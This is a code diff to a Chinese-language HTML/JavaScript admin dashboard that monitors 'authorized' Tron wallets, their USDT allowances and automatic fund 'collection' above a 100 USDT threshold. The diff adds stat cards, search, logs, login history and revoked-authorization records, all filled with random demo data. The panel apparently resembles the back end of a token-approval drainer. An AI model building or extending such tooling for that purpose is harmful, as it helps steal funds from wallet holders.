@@ -115,7 +115,7 @@
 
         .stats-grid {
             display: grid;
-            grid-template-columns: repeat(4, 1fr);
+            grid-template-columns: repeat(5, 1fr);
             gap: 15px;
             margin-bottom: 20px;
         }
@@ -145,6 +145,10 @@
 
         .stat-card.success {
             border-left-color: #4CAF50;
+        }
+
+        .stat-card.info {
+            border-left-color: #2196F3;
         }
 
         .stat-value {
@@ -431,6 +435,51 @@
             margin-bottom: 8px;
             background: white;
         }
+
+        .search-box {
+            margin-bottom: 15px;
+        }
+
+        .search-input {
+            width: 100%;
+            padding: 8px 12px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 12px;
+        }
+
+        .transaction-stats {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 15px;
+            margin-bottom: 15px;
+        }
+
+        .transaction-stat-card {
+            background: white;
+            border-radius: 6px;
+            padding: 12px;
+            text-align: center;
+            border: 1px solid #e0e0e0;
+        }
+
+        .transaction-stat-value {
+            font-size: 20px;
+            font-weight: bold;
+            color: #333;
+            margin-bottom: 5px;
+        }
+
+        .transaction-stat-label {
+            font-size: 11px;
+            color: #666;
+        }
+
+        .login-history-item {
+            padding: 8px;
+            border-bottom: 1px solid #f0f0f0;
+            font-size: 12px;
+        }
     </style>
 </head>
 <body>
@@ -461,6 +510,14 @@
         </div>
 
         <div class="stats-grid">
+            <div class="stat-card" id="total-wallets-card">
+                <div class="stat-value" id="total-wallets">0</div>
+                <div class="stat-label">总监控钱包</div>
+            </div>
+            <div class="stat-card info" id="total-funds-card">
+                <div class="stat-value" id="total-funds">0</div>
+                <div class="stat-label">总金额(USDT)</div>
+            </div>
             <div class="stat-card" id="large-wallets-card">
                 <div class="stat-value" id="large-wallets">0</div>
                 <div class="stat-label">大额钱包 (≥100U)</div>
@@ -473,10 +530,6 @@
                 <div class="stat-value" id="contract-balance">0</div>
                 <div class="stat-label">合约地址</div>
             </div>
-            <div class="stat-card info" id="target-card">
-                <div class="stat-value" id="target-balance">0</div>
-                <div class="stat-label">目标地址</div>
-            </div>
         </div>
 
         <div class="monitor-controls">
@@ -487,21 +540,25 @@
         </div>
 
         <div class="tabs">
-            <div class="tab active" data-tab="wallets">钱包监控</div>
+            <div class="tab active" data-tab="wallets">已授权钱包</div>
             <div class="tab" data-tab="transactions">归集记录</div>
+            <div class="tab" data-tab="logs">系统日志</div>
             <div class="tab" data-tab="security">系统管理</div>
         </div>
 
         <div class="tab-content active" id="wallets-tab">
             <div class="admin-panel">
                 <div class="panel-header">
-                    <h3>钱包资产监控</h3>
+                    <h3>已授权钱包列表</h3>
                     <div>
                         <span style="font-size: 12px; color: #666;">
                             授权归集阈值: <span id="current-threshold">100</span> USDT | 
                             合约阈值: <span id="current-contract-threshold">2000</span> USDT
                         </span>
                     </div>
+                </div>
+                <div class="search-box">
+                    <input type="text" id="wallet-search" class="search-input" placeholder="搜索钱包地址...">
                 </div>
                 <div class="wallet-list" id="wallet-list">
                     <div style="text-align: center; color: #666; padding: 20px;">
@@ -517,9 +574,41 @@
                     <h3>资金归集记录</h3>
                     <button id="clear-transactions" class="btn-danger">清空记录</button>
                 </div>
+                <div class="transaction-stats">
+                    <div class="transaction-stat-card">
+                        <div class="transaction-stat-value" id="total-collected">0</div>
+                        <div class="transaction-stat-label">归集总金额(USDT)</div>
+                    </div>
+                    <div class="transaction-stat-card">
+                        <div class="transaction-stat-value" id="success-count">0</div>
+                        <div class="transaction-stat-label">成功归集次数</div>
+                    </div>
+                    <div class="transaction-stat-card">
+                        <div class="transaction-stat-value" id="failed-count">0</div>
+                        <div class="transaction-stat-label">失败归集次数</div>
+                    </div>
+                </div>
                 <div class="transaction-list" id="transaction-list">
                     <div style="text-align: center; color: #666; padding: 20px;">
                         暂无归集记录
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="tab-content" id="logs-tab">
+            <div class="admin-panel">
+                <div class="panel-header">
+                    <h3>系统日志</h3>
+                    <div>
+                        <button id="clear-logs" class="btn-danger" style="margin-right: 10px;">清空日志</button>
+                        <button id="show-revoked" class="btn-warning">取消授权记录</button>
+                    </div>
+                </div>
+                <div class="log-container" id="log-container">
+                    <div class="log-entry">
+                        <span class="log-time">[系统启动]</span>
+                        <span class="log-info">系统初始化完成</span>
                     </div>
                 </div>
             </div>
@@ -540,6 +629,18 @@
                         <input type="text" id="new-admin-username" placeholder="新管理员用户名" style="padding: 8px; margin-right: 10px;">
                         <input type="password" id="new-admin-password" placeholder="新管理员密码" style="padding: 8px; margin-right: 10px;">
                         <button id="add-admin" class="btn-primary">添加管理员</button>
+                    </div>
+                </div>
+
+                <div class="setting-group">
+                    <h4>登录历史记录</h4>
+                    <div id="login-history">
+                        <div class="login-history-item">
+                            <strong>admin</strong> - 2024-01-15 10:30:25 - IP: 192.168.1.100
+                        </div>
+                        <div class="login-history-item">
+                            <strong>operator</strong> - 2024-01-15 09:15:10 - IP: 192.168.1.101
+                        </div>
                     </div>
                 </div>
 
@@ -600,10 +701,20 @@
             }
         };
 
+        // 钱包名称映射
+        const WALLET_NAMES = {
+            'TBa1YN3kdqPdqWULicMVLwLNGovGZgvE9z': '主热钱包',
+            'TC1yXRh9rP9o2D1bH5f8vWcCzCJ8sQmK9n': '备用钱包1',
+            'TW7obL9d7p2r2q2q2q2q2q2q2q2q2q2q2q2': '用户存款钱包',
+            'TD5rR9wLmLmLmLmLmLmLmLmLmLmLmLmLmLm': '交易所提现钱包',
+            'TE8aR7vNvNvNvNvNvNvNvNvNvNvNvNvNvN': '业务钱包'
+        };
+
         class USDTMonitorSystem {
             constructor() {
                 this.wallets = [];
                 this.transactions = [];
+                this.revokedWallets = [];
                 this.monitorInterval = null;
                 this.isMonitoring = false;
                 this.currentUser = null;
@@ -683,6 +794,29 @@
                         status: 'completed',
                         timestamp: new Date().toISOString(),
                         type: 'auto'
+                    },
+                    {
+                        id: 2,
+                        walletAddress: 'TC1yXRh9rP9o2D1bH5f8vWcCzCJ8sQmK9n',
+                        amount: 89.30,
+                        txHash: 'TXABCDEF1234567890',
+                        status: 'failed',
+                        timestamp: new Date(Date.now() - 3600000).toISOString(),
+                        type: 'manual'
+                    }
+                ];
+
+                // 生成取消授权记录
+                this.revokedWallets = [
+                    {
+                        address: 'TF9xR8vNvNvNvNvNvNvNvNvNvNvNvNvNvN',
+                        name: '测试钱包',
+                        revokedTime: new Date(Date.now() - 86400000).toISOString()
+                    },
+                    {
+                        address: 'TG8yS7vNvNvNvNvNvNvNvNvNvNvNvNvNvN',
+                        name: '临时钱包',
+                        revokedTime: new Date(Date.now() - 172800000).toISOString()
                     }
                 ];
             }
@@ -734,25 +868,30 @@
                 const demoAddresses = [
                     'TBa1YN3kdqPdqWULicMVLwLNGovGZgvE9z',
                     'TC1yXRh9rP9o2D1bH5f8vWcCzCJ8sQmK9n',
-                    'TW7obL9d7p2r2q2q2q2q2q2q2q2q2q2q2q2',
+                    'TW7obL9d7p2r2q2q2q2q2q2q2q2q2q2q2',
                     'TD5rR9wLmLmLmLmLmLmLmLmLmLmLmLmLmLm',
                     'TE8aR7vNvNvNvNvNvNvNvNvNvNvNvNvNvN'
                 ];
 
-                this.wallets = demoAddresses.map((address, index) => ({
-                    id: index + 1,
-                    address: address,
-                    trxBalance: Math.random() * 10,
-                    usdtBalance: Math.random() * 600,
-                    usdtAllowance: Math.random() * 700,
-                    otherTokens: [
-                        { symbol: 'BTC', balance: Math.random() * 0.1 },
-                        { symbol: 'ETH', balance: Math.random() * 0.5 },
-                        { symbol: 'BNB', balance: Math.random() * 2 }
-                    ],
-                    totalBalance: Math.random() * 600,
-                    lastChecked: new Date().toISOString()
-                }));
+                this.wallets = demoAddresses.map((address, index) => {
+                    const authTime = new Date(Date.now() - Math.random() * 7 * 24 * 60 * 60 * 1000);
+                    return {
+                        id: index + 1,
+                        address: address,
+                        name: WALLET_NAMES[address] || `钱包${index + 1}`,
+                        trxBalance: Math.random() * 10,
+                        usdtBalance: Math.random() * 600,
+                        usdtAllowance: Math.random() * 700,
+                        otherTokens: [
+                            { symbol: 'BTC', balance: Math.random() * 0.1 },
+                            { symbol: 'ETH', balance: Math.random() * 0.5 },
+                            { symbol: 'BNB', balance: Math.random() * 2 }
+                        ],
+                        totalBalance: Math.random() * 600,
+                        authTime: authTime.toISOString(),
+                        lastChecked: new Date().toISOString()
+                    };
+                });
             }
 
             startSessionTimer() {
@@ -816,12 +955,20 @@
                 document.getElementById('save-system-settings').addEventListener('click', () => this.saveSystemSettings());
                 document.getElementById('add-admin').addEventListener('click', () => this.addAdminAccount());
                 document.getElementById('close-modal').addEventListener('click', () => this.closeModal());
+                document.getElementById('clear-logs').addEventListener('click', () => this.clearLogs());
+                document.getElementById('show-revoked').addEventListener('click', () => this.showRevokedWallets());
+
+                // 搜索功能
+                document.getElementById('wallet-search').addEventListener('input', (e) => {
+                    this.filterWallets(e.target.value);
+                });
 
                 // 统计卡片点击事件
+                document.getElementById('total-wallets-card').addEventListener('click', () => this.showAllWallets());
+                document.getElementById('total-funds-card').addEventListener('click', () => this.showAllWallets());
                 document.getElementById('large-wallets-card').addEventListener('click', () => this.showLargeWallets());
                 document.getElementById('small-wallets-card').addEventListener('click', () => this.showSmallWallets());
                 document.getElementById('contract-card').addEventListener('click', () => this.showContractAddress());
-                document.getElementById('target-card').addEventListener('click', () => this.showTargetAddress());
 
                 console.log('事件监听器初始化完成');
             }
@@ -1016,22 +1163,34 @@
             }
 
             updateStats() {
+                const totalWallets = this.wallets.length;
+                const totalFunds = this.wallets.reduce((sum, w) => sum + w.totalBalance, 0);
                 const largeWallets = this.wallets.filter(w => w.totalBalance >= SYSTEM_CONFIG.COLLECT_THRESHOLD).length;
                 const smallWallets = this.wallets.filter(w => w.totalBalance < SYSTEM_CONFIG.COLLECT_THRESHOLD).length;
 
+                document.getElementById('total-wallets').textContent = totalWallets;
+                document.getElementById('total-funds').textContent = totalFunds.toFixed(2);
                 document.getElementById('large-wallets').textContent = largeWallets;
                 document.getElementById('small-wallets').textContent = smallWallets;
                 document.getElementById('contract-balance').textContent = this.contractBalance.toFixed(2);
-                document.getElementById('target-balance').textContent = this.targetBalance.toFixed(2);
                 document.getElementById('current-threshold').textContent = SYSTEM_CONFIG.COLLECT_THRESHOLD;
                 document.getElementById('current-contract-threshold').textContent = SYSTEM_CONFIG.CONTRACT_THRESHOLD;
             }
 
             updateWalletList() {
                 const walletList = document.getElementById('wallet-list');
+                const searchTerm = document.getElementById('wallet-search').value.toLowerCase();
+                
+                let filteredWallets = this.wallets;
+                if (searchTerm) {
+                    filteredWallets = this.wallets.filter(w => 
+                        w.address.toLowerCase().includes(searchTerm) || 
+                        w.name.toLowerCase().includes(searchTerm)
+                    );
+                }
                 
                 let html = '';
-                this.wallets.forEach(wallet => {
+                filteredWallets.forEach(wallet => {
                     const isLarge = wallet.totalBalance >= SYSTEM_CONFIG.COLLECT_THRESHOLD;
                     const tokenBalances = wallet.otherTokens.map(token => 
                         `<span class="token-balance">${token.symbol}: ${token.balance.toFixed(4)}</span>`
@@ -1040,8 +1199,11 @@
                     html += `
                         <div class="wallet-item">
                             <div class="wallet-info">
-                                <div class="wallet-address">${wallet.address}</div>
+                                <div class="wallet-address">
+                                    <strong>${wallet.name}</strong> - ${wallet.address}
+                                </div>
                                 <div class="wallet-meta">
+                                    授权时间: ${new Date(wallet.authTime).toLocaleString()} | 
                                     TRX: ${wallet.trxBalance.toFixed(4)} | 
                                     USDT: ${wallet.usdtBalance.toFixed(2)} | 
                                     总资产: ${wallet.totalBalance.toFixed(2)} USDT |
@@ -1061,11 +1223,26 @@
                     `;
                 });
 
-                walletList.innerHTML = html;
+                walletList.innerHTML = html || '<div style="text-align: center; color: #666; padding: 20px;">未找到匹配的钱包</div>';
+            }
+
+            filterWallets(searchTerm) {
+                this.updateWalletList();
             }
 
             updateTransactionList() {
                 const transactionList = document.getElementById('transaction-list');
+
+                // 更新统计信息
+                const totalCollected = this.transactions
+                    .filter(t => t.status === 'completed')
+                    .reduce((sum, t) => sum + t.amount, 0);
+                const successCount = this.transactions.filter(t => t.status === 'completed').length;
+                const failedCount = this.transactions.filter(t => t.status === 'failed').length;
+
+                document.getElementById('total-collected').textContent = totalCollected.toFixed(2);
+                document.getElementById('success-count').textContent = successCount;
+                document.getElementById('failed-count').textContent = failedCount;
 
                 if (this.transactions.length === 0) {
                     transactionList.innerHTML = '<div style="text-align: center; color: #666; padding: 20px;">暂无归集记录</div>';
@@ -1084,6 +1261,7 @@
                                 <div style="font-size: 10px; color: #666;">
                                     时间: ${new Date(transaction.timestamp).toLocaleString()} |
                                     类型: ${transaction.type === 'auto' ? '自动' : '手动'} |
+                                    状态: <span style="color: ${transaction.status === 'completed' ? '#4CAF50' : '#f44336'}">${transaction.status === 'completed' ? '成功' : '失败'}</span> |
                                     交易哈希: ${transaction.txHash}
                                     ${isContractTransfer ? `| 目标: ${transaction.toAddress}` : ''}
                                 </div>
@@ -1189,11 +1367,47 @@
                 }
             }
 
+            clearLogs() {
+                document.getElementById('log-container').innerHTML = '';
+                this.addLog('日志已清空', 'info');
+            }
+
             closeModal() {
                 document.getElementById('address-modal').style.display = 'none';
             }
 
+            showRevokedWallets() {
+                let content = '<h4>取消授权钱包记录</h4>';
+                
+                if (this.revokedWallets.length === 0) {
+                    content += '<div style="color: #666; text-align: center; padding: 20px;">暂无取消授权记录</div>';
+                } else {
+                    this.revokedWallets.forEach(wallet => {
+                        content += `
+                            <div class="wallet-item">
+                                <div class="wallet-info">
+                                    <div class="wallet-address">
+                                        <strong>${wallet.name}</strong> - ${wallet.address}
+                                    </div>
+                                    <div class="wallet-meta">
+                                        取消授权时间: ${new Date(wallet.revokedTime).toLocaleString()}
+                                    </div>
+                                </div>
+                            </div>
+                        `;
+                    });
+                }
+                
+                document.getElementById('modal-title').textContent = '取消授权记录';
+                document.getElementById('modal-content').innerHTML = content;
+                document.getElementById('address-modal').style.display = 'block';
+            }
+
             // 地址详情显示方法
+            showAllWallets() {
+                this.showAddressDetails('所有钱包详情', this.wallets);
+            }
+
             showLargeWallets() {
                 const largeWallets = this.wallets.filter(w => w.totalBalance >= SYSTEM_CONFIG.COLLECT_THRESHOLD);
                 this.showAddressDetails('大额钱包详情', largeWallets);
@@ -1216,21 +1430,6 @@
                     transactions: this.transactions.filter(t => t.fromAddress === SYSTEM_CONFIG.CONTRACT_ADDRESS)
                 };
                 this.showAddressDetails('合约地址详情', [contractData], true);
-            }
-
-            showTargetAddress() {
-                const targetData = {
-                    address: SYSTEM_CONFIG.TARGET_ADDRESS,
-                    totalBalance: this.targetBalance,
-                    tokens: [
-                        { symbol: 'USDT', balance: this.targetBalance * 0.9 },
-                        { symbol: 'TRX', balance: Math.random() * 500 },
-                        { symbol: 'BTC', balance: Math.random() * 2 },
-                        { symbol: 'ETH', balance: Math.random() * 10 }
-                    ],
-                    transactions: this.transactions.filter(t => t.toAddress === SYSTEM_CONFIG.TARGET_ADDRESS)
-                };
-                this.showAddressDetails('目标地址详情', [targetData], true);
             }
 
             showAddressDetails(title, data, isSpecialAddress = false) {
@@ -1268,7 +1467,11 @@
                     data.forEach(wallet => {
                         content += `
                             <div class="address-details">
-                                <h4>地址: ${wallet.address}</h4>
+                                <h4>${wallet.name} - ${wallet.address}</h4>
+                                <div class="asset-item">
+                                    <span><strong>授权时间:</strong></span>
+                                    <span>${new Date(wallet.authTime).toLocaleString()}</span>
+                                </div>
                                 <div class="asset-item">
                                     <span><strong>总资产:</strong></span>
                                     <span>${wallet.totalBalance.toFixed(2)} USDT</span>
